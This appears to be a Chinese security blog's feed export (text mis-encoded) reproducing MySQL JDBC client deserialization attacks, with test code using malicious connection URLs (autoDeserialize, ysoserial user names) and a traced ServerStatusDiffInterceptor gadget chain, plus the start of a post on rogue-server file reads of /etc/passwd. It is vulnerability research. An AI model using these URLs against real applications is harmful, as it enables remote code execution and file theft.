class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * detectCustomCollationsè§¦å‘</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.29-5.1.40:jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 5.1.29 æµ‹è¯•é€šè¿‡</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">detectCustomCollationsTest5_1_29TO5_1_40</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?useSSL=false&amp;autoDeserialize=true&amp;detectCustomCollations=true&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.28-5.1.19ï¼šjdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 5.1.19 æµ‹è¯•é€šè¿‡</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">detectCustomCollationsTest5_1_19TO5_1_28</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3306/?useSSL=false&amp;autoDeserialize=true&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.18ä»¥ä¸‹çš„5.1.xç‰ˆæœ¬ï¼šä¸å¯ç”¨</span></span><br><span class="line"><span class="comment">// 5.0.xç‰ˆæœ¬ä¸å¯ç”¨</span></span><br></pre></td></tr></table></figure><h3 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h3><p>çŸ¥å…¶ç„¶æ›´éœ€çŸ¥å…¶æ‰€ä»¥ç„¶ï¼Œä¸‹é¢å°è¯•åå‘å¤ç°æ˜¯å¦‚ä½•å‘ç°è¿™ä¸¤ä¸ªåˆ©ç”¨é“¾çš„</p><p>autoDeserializeæ˜¯æºå¤´ï¼Œä»autoDeserializeå‚æ•°å¼€å§‹åˆ†æ</p><h4 id="1-autoDeserializeçš„è°ƒç”¨æƒ…å†µ"><a href="#1-autoDeserializeçš„è°ƒç”¨æƒ…å†µ" class="headerlink" title="1. autoDeserializeçš„è°ƒç”¨æƒ…å†µ"></a>1. autoDeserializeçš„è°ƒç”¨æƒ…å†µ</h4><p><img src="/images/pasted-126.png" alt="upload successful"></p><pre><code>å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœå­—æ®µç±»å‹æ˜¯Binaryæˆ–è€…BLOBï¼Œä¼šè¿›è¡Œååºåˆ—åŒ–ï¼Œå…¶ä¸­-84ã€-19ä¸º0xacedï¼Œjavaååºåˆ—åŒ–æ ‡å¿—ã€‚</code></pre><h4 id="2-åå‘è¿½è¸ª"><a href="#2-åå‘è¿½è¸ª" class="headerlink" title="2. åå‘è¿½è¸ª"></a>2. åå‘è¿½è¸ª</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ClientPreparedStatement.EmulatedPreparedStatementBindings</span><br><span class="line">    getObject(int)</span><br><span class="line">        2015 return this.bindingsAsRs.getObject(parameterIndex);</span><br><span class="line"></span><br><span class="line">DatabaseMetaData.ResultSetIterator</span><br><span class="line">    next()</span><br><span class="line">        146 return this.resultSet.getObject(this.colIndex).toString();</span><br><span class="line"></span><br><span class="line">ResultSetUtil</span><br><span class="line">    resultSetToMap(Map, ResultSet)</span><br><span class="line">        46 mappedValues.put(rs.getObject(1), rs.getObject(2));</span><br><span class="line">    resultSetToMap(Map, ResultSet, int, int)</span><br><span class="line">        53 mappedValues.put(rs.getObject(key), rs.getObject(value));</span><br><span class="line"></span><br><span class="line">UpdatableResultSet</span><br><span class="line">    syncUpdate()</span><br><span class="line">        1141 this.updater.setObject(i + 1, getObject(i + 1), fields[i].getMysqlType());</span><br></pre></td></tr></table></figure><ul><li><p>2.1. ClientPreparedStatement.EmulatedPreparedStatementBindings</p><p>  PreparedStatementæ˜¯é¢„ç¼–è¯‘ï¼Œè¿˜æ˜¯åªèƒ½åœ¨client é€šè¿‡ä¸»åŠ¨è°ƒç”¨getObjectè§¦å‘ï¼Œå¯¹åˆ©ç”¨æ— æ•ˆ</p></li><li><p>2.2. UpdatableResultSet</p><p>  UpdatableResultSetä¸ºæ›´æ–°Resultï¼Œæœªæ‰¾åˆ°åˆ©ç”¨ç‚¹</p></li></ul><h5 id="2-3-DatabaseMetaData-ResultSetIterator"><a href="#2-3-DatabaseMetaData-ResultSetIterator" class="headerlink" title="2.3. DatabaseMetaData.ResultSetIterator"></a>2.3. DatabaseMetaData.ResultSetIterator</h5><p>å°è¯•äº†å‡ ä¸ªé“¾ï¼Œéƒ½ä¸å¤ªå®ç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ConnectionImpl#setAutoCommit</span><br><span class="line">IterateBlock#doForAll</span><br><span class="line">DatabaseMetaData.IterateBlock#doForAll</span><br><span class="line">DatabaseMetaData.ResultSetIterator#next</span><br></pre></td></tr></table></figure><p>å¤±è´¥ï¼ŒResultSetIteratoræ˜¯protectç±»ï¼Œæ— æ³•é€šè¿‡Class.forName(className).newInstance()å®ä¾‹åŒ–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DatabaseMetaData#getTables&#x2F;getCloumnsç­‰</span><br><span class="line">DatabaseMetaData#getCatalogIterator</span><br><span class="line">DatabaseMetaData.IterateBlock#doForAll</span><br><span class="line">DatabaseMetaData.ResultSetIterator#next</span><br></pre></td></tr></table></figure><p>è§¦å‘å›°éš¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ConnectionImpl#prepareCall</span><br><span class="line">  CallableStatement#getInstance</span><br><span class="line">    CallableStatement#CallableStatement</span><br><span class="line">      CallableStatement#determineParameterTypes</span><br><span class="line">        DatabaseMetaData#getProcedureColumns</span><br><span class="line">          DatabaseMetaData#getProcedureOrFunctionColumns</span><br><span class="line">            DatabaseMetaData#getProceduresAndOrFunctions</span><br><span class="line">              DatabaseMetaData#getCatalogIterator</span><br><span class="line">                DatabaseMetaData.IterateBlock#doForAll</span><br><span class="line">                  DatabaseMetaData.ResultSetIterator#next</span><br></pre></td></tr></table></figure><p>è§¦å‘å›°éš¾</p><h5 id="2-4-ResultSetUtil"><a href="#2-4-ResultSetUtil" class="headerlink" title="2.4. ResultSetUtil"></a>2.4. ResultSetUtil</h5><p>æœ‰åˆ©ç”¨ç‚¹ï¼Œåå‘è¿½æº¯è¿‡ç¨‹å¦‚ä¸‹</p><h6 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h6><p>ResultSetUtil#resultSetToMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">resultSetToMap</span><span class="params">(Map mappedValues, ResultSet rs)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">       <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">           mappedValues.put(rs.getObject(<span class="number">1</span>), rs.getObject(<span class="number">2</span>));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">resultSetToMap</span><span class="params">(Map mappedValues, java.sql.ResultSet rs, <span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">       <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">           mappedValues.put(rs.getObject(key), rs.getObject(value));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>ServerStatusDiffInterceptor#populateMapWithSessionStatusValues</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">populateMapWithSessionStatusValues</span><span class="params">(Map&lt;String, String&gt; toPopulate)</span> </span>&#123;</span><br><span class="line">    java.sql.Statement stmt = <span class="keyword">null</span>;</span><br><span class="line">    java.sql.ResultSet rs = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            toPopulate.clear();</span><br><span class="line"></span><br><span class="line">            stmt = <span class="keyword">this</span>.connection.createStatement();</span><br><span class="line">            rs = stmt.executeQuery(<span class="string">&quot;SHOW SESSION STATUS&quot;</span>);</span><br><span class="line">            ResultSetUtil.resultSetToMap(toPopulate, rs);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„äº†æ‰§è¡Œsql:SHOW SESSION STATUS</p><ul><li>evil mysql serverå¯æ§æƒ…å†µä¸‹ï¼Œå¯ä»¥è¿”å›å¯æ§çš„sqlç»“æœï¼Œä»è€Œè§¦å‘åç»­çš„ååºåˆ—åŒ–</li><li>å¦‚ä½•è§¦å‘populateMapWithSessionStatusValuesï¼Œç»§ç»­è·Ÿè¸ª</li></ul><p>å‘ç°ServerStatusDiffInterceptor#postProcesså’Œ#preProcessæœ‰ä¸¤å¤„è°ƒç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ServerStatusDiffInterceptor</span><br><span class="line">    postProcess(Supplier&lt;String&gt;, Query, T, ServerSession)</span><br><span class="line">        69 populateMapWithSessionStatusValues(this.postExecuteValues);</span><br><span class="line">    preProcess(Supplier&lt;String&gt;, Query)</span><br><span class="line">        105 populateMapWithSessionStatusValues(this.preExecuteValues);</span><br></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œå’Œç»“æœå·²ç»å¾ˆæ¥è¿‘äº†</p><ol><li>å‡å¦‚äº†è§£jdbc mysql çš„å‚æ•°ï¼ŒçŸ¥é“æœ‰ä¸ªå‚æ•°queryInterceptorsï¼Œé‚£å¯¹åº”èµ·æ¥å¾ˆå¿«å°±çŸ¥é“ç­”æ¡ˆäº†</li><li>ä½†æ˜¯æˆ‘æ˜¯ä¸äº†è§£çš„ï¼Œåªèƒ½è‹¦é€¼çš„ç»§ç»­è·Ÿè¸ªäº†</li></ol><p>NoSubInterceptorWrapper#preProcess</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">preProcess</span><span class="params">(Supplier&lt;String&gt; sql, Query interceptedQuery)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.underlyingInterceptor.preProcess(sql, interceptedQuery);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NativeProtocol#invokeQueryInterceptorsPre</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">invokeQueryInterceptorsPre</span><span class="params">(Supplier&lt;String&gt; sql, Query interceptedQuery, <span class="keyword">boolean</span> forceExecute)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">                T interceptedResultSet = interceptor.preProcess(sql, interceptedQuery);</span><br></pre></td></tr></table></figure><p>NativeProtocol#sendQueryPacket</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">sendQueryPacket</span><span class="params">(Query callingQuery, NativePacketPayload queryPacket, <span class="keyword">int</span> maxRows, <span class="keyword">boolean</span> streamResults,</span></span></span><br><span class="line"><span class="function"><span class="params">...</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">if</span> (<span class="keyword">this</span>.queryInterceptors != <span class="keyword">null</span>)</span> </span>&#123;</span><br><span class="line">                T interceptedResults = invokeQueryInterceptorsPre(query, callingQuery, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>NativeSession#execSQL</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">execSQL</span><span class="params">(Query callingQuery, String query, <span class="keyword">int</span> maxRows, NativePacketPayload packet, <span class="keyword">boolean</span> streamResults,</span></span></span><br><span class="line"><span class="function"><span class="params">...</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">try</span> &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">if</span> (packet == <span class="keyword">null</span>)</span> </span>&#123;</span><br><span class="line">                String encoding = <span class="keyword">this</span>.characterEncoding.getValue();</span><br><span class="line">                <span class="keyword">return</span> ((NativeProtocol) <span class="keyword">this</span>.protocol).sendQueryString(callingQuery, query, encoding, maxRows, streamResults, catalog, cachedMetadata,</span><br><span class="line">                        <span class="keyword">this</span>::getProfilerEventHandlerInstanceFunction, resultSetFactory);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ((NativeProtocol) <span class="keyword">this</span>.protocol).sendQueryPacket(callingQuery, packet, maxRows, streamResults, catalog, cachedMetadata,</span><br><span class="line">                    <span class="keyword">this</span>::getProfilerEventHandlerInstanceFunction, resultSetFactory);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ConnectionImpl#setAutoCommit</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">final</span> <span class="keyword">boolean</span> autoCommitFlag)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">...</span><br><span class="line">                    <span class="keyword">this</span>.session.execSQL(<span class="keyword">null</span>, autoCommitFlag ? <span class="string">&quot;SET autocommit=1&quot;</span> : <span class="string">&quot;SET autocommit=0&quot;</span>, -<span class="number">1</span>, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="keyword">this</span>.nullStatementResultSetFactory,</span><br><span class="line">                            <span class="keyword">this</span>.database, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>æŠ“åŒ…çœ‹è¿‡mysqlåè®®çš„éƒ½æ¸…æ¥šï¼Œloginä¹‹åï¼Œclientå’Œserverä¼šæ²Ÿé€šä¸€äº›å‚æ•°ï¼Œå…¶ä¸­å°±æœ‰autocommitï¼Œæ‰€ä»¥é“¾è·¯å¾„ä¸Šæ˜¯æ²¡é—®é¢˜äº†ï¼Œéœ€è¦è§£å†³çš„æ˜¯é“¾ä¸Šçš„è¯¸å¤šæ¡ä»¶<br><img src="/images/pasted-127.png" alt="upload successful"></p><h6 id="queryInterceptorsçš„åˆå§‹åŒ–"><a href="#queryInterceptorsçš„åˆå§‹åŒ–" class="headerlink" title="queryInterceptorsçš„åˆå§‹åŒ–"></a>queryInterceptorsçš„åˆå§‹åŒ–</h6><p>å…¶ä¸­é‡ç‚¹æ˜¯queryInterceptorså–å€¼é—®é¢˜ï¼Œæœ€å¼€å§‹å‡ºç°åœ¨NativeProtocol#sendQueryPacket</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">invokeQueryInterceptorsPre</span><span class="params">(Supplier&lt;String&gt; sql, Query interceptedQuery, <span class="keyword">boolean</span> forceExecute)</span> </span>&#123;</span><br><span class="line">    T previousResultSet = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, s = <span class="keyword">this</span>.queryInterceptors.size(); i &lt; s; i++) &#123;</span><br><span class="line">        QueryInterceptor interceptor = <span class="keyword">this</span>.queryInterceptors.get(i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> executeTopLevelOnly = interceptor.executeTopLevelOnly();</span><br><span class="line">        <span class="keyword">boolean</span> shouldExecute = (executeTopLevelOnly &amp;&amp; (<span class="keyword">this</span>.statementExecutionDepth == <span class="number">1</span> || forceExecute)) || (!executeTopLevelOnly);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (shouldExecute) &#123;</span><br><span class="line">            T interceptedResultSet = interceptor.preProcess(sql, interceptedQuery);</span><br></pre></td></tr></table></figure><p>è¿½æº¯å‘ç°</p><p>NativeProtocol#queryInterceptors<br>NativeSession#queryInterceptors<br>ConnectionImpl#queryInterceptors</p><p>æœ€ç»ˆå®šä½æ˜¯åœ¨initializeSafeQueryInterceptorsè¿›è¡Œçš„åˆå§‹åŒ–</p><p>ConnectionImpl#initializeSafeQueryInterceptors</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initializeSafeQueryInterceptors</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.queryInterceptors = Util</span><br><span class="line">                .&lt;QueryInterceptor&gt; loadClasses(<span class="keyword">this</span>.propertySet.getStringProperty(PropertyKey.queryInterceptors).getStringValue(),</span><br><span class="line">                        <span class="string">&quot;MysqlIo.BadQueryInterceptor&quot;</span>, getExceptionInterceptor())</span><br><span class="line">                .stream().map(o -&gt; <span class="keyword">new</span> NoSubInterceptorWrapper(o.init(<span class="keyword">this</span>, <span class="keyword">this</span>.props, <span class="keyword">this</span>.session.getLog()))).collect(Collectors.toList());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è€ŒPropertyKeyï¼Œå¯ä»¥é€šè¿‡jdbc urlå‚æ•°è¿›è¡ŒæŒ‡å®šï¼Œé—®é¢˜è§£å†³ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬èŠ‚åœ¨è€å¸ˆå‚…ä»¬çš„æ–‡æ¡£åŸºç¡€ä¸Šï¼Œæ‰‹åŠ¨å¤ç°äº†jdbc mysql connector 8.0.14 cc7çš„ååºåˆ—åŒ–ï¼Œä»¥åŠä¸åŒç‰ˆæœ¬åœ¨ServerStatusDiffInterceptorå’ŒdetectCustomCollations ä¸¤ç§æ–¹å¼çš„ååºåˆ—åŒ–å¤ç°ï¼Œæ²¡æœ‰ä»€ä¹ˆæ–°çš„ä¸œè¥¿ã€‚</p><p>æ±‚æ¸”å¾—æ¸”ï¼ŒååŠéƒ¨åˆ†è¯•ç€åå‘å»æŒ–æ˜jdbc mysqlååºåˆ—åŒ–çš„åˆ©ç”¨é“¾ï¼Œåœ¨8.0.14ç‰ˆæœ¬ä¸Šå‘ç°äº†å‡ ä¸ªé¸¡è‚‹çš„é“¾ï¼Œæœ€ç»ˆå‘ç°ServerStatusDiffInterceptoré“¾ï¼Œè¿‡ç¨‹è™½ç„¶ç¨é•¿ï¼Œä¸è¿‡ä¹Ÿç®—æ˜¯æœ€å¤§çš„æ”¶è·ã€‚</p><p>è€æ ·å­ï¼ŒæŠ›å‡ ä¸ªé—®é¢˜</p><ol><li>åœ¨åå‘æ‰¾é“¾çš„æ—¶å€™ï¼Œå‘ç°æœ¬åœ°è¿˜æœ‰ä¸€äº›ç±»è°ƒç”¨äº†ResultSetUtil.getObjectï¼Œä¼šä¸ä¼šæœ‰æ–°çš„åˆ©ç”¨é“¾</li><li>Binaryç±»å‹ä¹Ÿæœ‰åŒæ ·çš„é—®é¢˜ï¼Œæµ‹è¯•ä¸‹ï¼Ÿ</li><li>ç›®å‰çœ‹æ¥autoDeserializeæ˜¯å¼ºç‰¹å¾ï¼Œå¥½åƒæ²¡ç»•è¿‡è¿™ä¸ªç‰¹å¾å§¿åŠ¿äº†</li></ol><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://paper.seebug.org/1227/">MySQL JDBC å®¢æˆ·ç«¯ååºåˆ—åŒ–æ¼æ´ï¼ˆå››å“¥ï¼‰</a></li><li>[2] <a href="https://www.anquanke.com/post/id/203086">MySQL JDBC å®¢æˆ·ç«¯ååºåˆ—åŒ–æ¼æ´åˆ†æï¼ˆfnmsd@360ï¼‰</a></li><li>[3] <a href="https://xz.aliyun.com/t/9250">MySQL JDBC ååºåˆ—åŒ–åˆ†æï¼ˆ7tem7ï¼‰</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;å‚è€ƒã€1ã€‘ä¸­å››å“¥å·²ç»è®²çš„å¾ˆå…¨é¢ä¹Ÿå¾ˆè¯¦ç»†äº†ï¼Œç®€å•è®°å½•ä¸‹å¤ç°è¿‡ç¨‹å§&lt;/p&gt;
&lt;h2 id=&quot;MySQL-ååºåˆ—åŒ–&quot;&gt;&lt;a href=&quot;#MySQL-ååºåˆ—åŒ–&quot; class=&quot;headerlink&quot; title=&quot;MySQL ååºåˆ—åŒ–&quot;&gt;&lt;/a&gt;MySQL ååºåˆ—åŒ–&lt;/h2&gt;&lt;h3 id=&quot;autoDeserialize&quot;&gt;&lt;a href=&quot;#autoDeserialize&quot; class=&quot;headerlink&quot; title=&quot;autoDeserialize&quot;&gt;&lt;/a&gt;autoDeserialize&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-125.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
&lt;p&gt;å¦‚è§£é‡Šï¼Œmysql clientä¼šè‡ªåŠ¨ååºåˆ—åŒ–serverç«¯ä¼ å›çš„BLOBç±»å‹&lt;/p&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="Jdbc" scheme="http://m0d9.me/tags/Jdbc/"/>
    
    <category term="MySQL" scheme="http://m0d9.me/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>Jdbc ç¢ç¢å¿µä¸€ï¼šMySQL Clientæ–‡ä»¶è¯»å–</title>
    <link href="http://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    <id>http://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/</id>
    <published>2021-04-20T03:20:00.000Z</published>
    <updated>2021-04-21T09:36:24.245Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰Getäº†h2 initsqlçš„éªšå§¿åŠ¿ï¼Œäºæ˜¯æƒ³æ€»ç»“æ€»ç»“jdbc urlå¯æ§æƒ…å†µä¸‹çš„åˆ©ç”¨æ–¹æ³•ï¼Œç»å…¸çš„åœºæ™¯å°±æ˜¯jdbc mysql æ–‡ä»¶è¯»å–å’Œååºåˆ—åŒ–ï¼Œæ­£å¥½å‰ä¸ä¹…çš„Druid CVE-2021-26919çš„ç”¨çš„å°±æ˜¯jdbc mysqlååºåˆ—åŒ–æ¼æ´ï¼Œå­¦ä¹ å­¦ä¹ ï¼Œå±…ç„¶è¸©ä¸€äº›å‘ï¼Œå•ç‹¬è®°å½•ä¸‹æ¥ã€‚</p><p>mysql clientä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å†å²æ‚ ä¹…ï¼Œå‚è€ƒã€6ã€‘ä¸­æœ‰æåˆ°æ—©åœ¨13å¹´å°±æœ‰æå‡ºï¼Œä½†æ˜¯ä½œä¸ºmysql æ­£å¸¸åŠŸèƒ½ä¸€ç›´ä¿ç•™ã€‚ç›´åˆ°19å¹´blackhat å¼ æ¨å’Œå¯å¥• å¤§ä½¬å‘ç°ååºåˆ—åŒ–çš„åˆ©ç”¨åœºæ™¯ï¼ˆå‚è€ƒã€5ã€‘ï¼‰ï¼Œç›¸å…³ç ”ç©¶è¾¾åˆ°å°é«˜æ½®ï¼Œä¸è¿‡å¤šèµ˜è¿°ã€‚</p><h2 id="MySQL-Clientæ–‡ä»¶è¯»å–æ¼æ´"><a href="#MySQL-Clientæ–‡ä»¶è¯»å–æ¼æ´" class="headerlink" title="MySQL Clientæ–‡ä»¶è¯»å–æ¼æ´"></a>MySQL Clientæ–‡ä»¶è¯»å–æ¼æ´</h2><h3 id="åŸç†ï¼šload-local-data"><a href="#åŸç†ï¼šload-local-data" class="headerlink" title="åŸç†ï¼šload local data"></a>åŸç†ï¼šload local data</h3><p>æ­£å¸¸çš„load local dataæµç¨‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clientï¼šç”³è¯·è·‘ä¸ªsqlï¼Œå†…å®¹æ˜¯&quot;load data local infile &quot;&#x2F;etc&#x2F;passwd&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;;&quot;</span><br><span class="line">serverï¼šå¥½çš„ï¼Œï¼ˆè¯†åˆ«sqlå†…å®¹ï¼‰ï¼Œé‚£ä½ æŠŠ&#x2F;etc&#x2F;passwdæ–‡ä»¶è¯»å–ä¼ è¿‡æ¥å§</span><br><span class="line">clientï¼šå¥½çš„ï¼Œï¼ˆè¯»å–æœ¬åœ°&#x2F;etc&#x2F;passwdï¼‰ï¼Œè¿™æ˜¯æ–‡ä»¶å†…å®¹ï¼Œè¯·æŸ¥æ”¶</span><br></pre></td></tr></table></figure><p>æ”»å‡»æµç¨‹</p><figure 